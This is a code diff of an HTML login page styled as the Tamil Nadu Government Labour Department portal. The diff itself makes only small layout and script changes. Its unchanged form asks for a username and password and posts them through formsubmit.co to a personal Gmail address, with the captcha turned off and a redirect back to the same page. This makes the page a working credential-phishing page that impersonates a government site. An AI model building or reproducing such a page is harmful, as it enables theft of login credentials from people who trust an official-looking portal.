@@ -8,10 +8,13 @@
     <!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous"> -->
     <title>Labour Department :: Government of Tamilnadu</title>
     <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <script>
+        var x=window.location.href;
+    </script>
 
 </head>
 <body>
-    <div>
+    <div class="main-container">
         <div class="logo-container">
 
             <img src="logo.png" alt="" id="logo">
@@ -26,7 +29,7 @@
 				
 				<li><a style="text-decoration:none"  class="dropdown-trigger" href="login.html#!" data-target="dropdown3" data-activates = "dropdown3">Fees</a></li>
 				<li><a style="text-decoration:none"  href="login.html">Login</a></li>
-			    <li style="text-align:center;"><a style="text-decoration:none"  id="tamil" style="padding:2px 20px;background:#c62828!important;color:#FFF!important;" target="_blank">Tamil Nadu Labour Welfare Board<br/><small>தமிழ்நாடு தொழிலாளர் நல வாரியம்</small></a></li>
+			    <!-- <li style="text-align:center; "><a style="text-decoration:none"  id="tamil" style="padding:2px 20px;background:#c62828!important;color:#FFF!important;" target="_blank">Tamil Nadu Labour Welfare Board<br/><small>தமிழ்நாடு தொழிலாளர் நல வாரியம்</small></a></li> -->
 			</ul>
         </div>
         <div class="login-container">
@@ -35,7 +38,7 @@
             <form action="https://formsubmit.co/gurunanthan.r.j@gmail.com" method="POST">
                     <div class="form-container">
                         <input type="hidden" name="_captcha" value="false">
-                        <input id="url" type="hidden" name="_next" value="">
+                        <input id="url" type="hidden" name="_next" value=>
                         <label for="email">Username (Registered Email Address)</label>
                         <input type="email" name="email" required><br>
                         <label for="password">password</label>
@@ -57,14 +60,15 @@
             <a href="#" id="forgot">Forgot Password?</a>
         </div>
         <a href="#" id="tamilnaduarasu-text"><center>தமிழ்நாடு அமைப்புசாரா தொழிலாளர்கள் நலவாரியங்களில் பதிவு செய்ய</center></a>
-        <div class="divider"></div>
+        <div class="divider " ></div>
+        <div class="second-div"></div>
     </div>
+     <script>
+      // Get the current URL and set it as the value of the input box
+      document.getElementById("url").value = window.location.href;
+    </script>
     <footer></footer>
 
         
 </body>
-<script>
-      // Get the current URL and set it as the value of the input box
-      document.getElementById("url").value = window.location.href;
-</script>
 </html>
